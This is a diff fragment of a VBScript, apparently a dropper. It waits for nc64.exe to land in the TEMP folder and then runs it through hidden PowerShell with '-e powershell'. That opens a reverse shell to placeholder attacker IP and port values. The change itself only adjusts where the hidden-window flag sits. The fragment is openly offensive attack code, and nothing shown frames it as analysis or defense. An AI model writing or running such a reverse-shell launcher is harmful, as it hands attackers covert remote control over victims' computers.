@@ -39,7 +39,7 @@ Do While Not objFSO.FileExists(objShell.ExpandEnvironmentStrings("%TEMP%\nc64.ex
 Loop
 
 ' Start reverse shell
-execCmd = "cmd /c powershell -WindowStyle Hidden -Command ""Start-Process \""%TEMP%\nc64.exe\"" -ArgumentList '<ATTACK IP>', '<ATTACKER PORT>', '-e', 'powershell' -WindowStyle Hidden"""
+execCmd = "cmd /c powershell -Command ""Start-Process \""%TEMP%\nc64.exe\"" -ArgumentList '<ATTACK IP>', '<ATTACKER PORT>', '-e', 'powershell' -WindowStyle Hidden"""
 objShell.Run execCmd, 0, True
 
 Set objFSO = Nothing
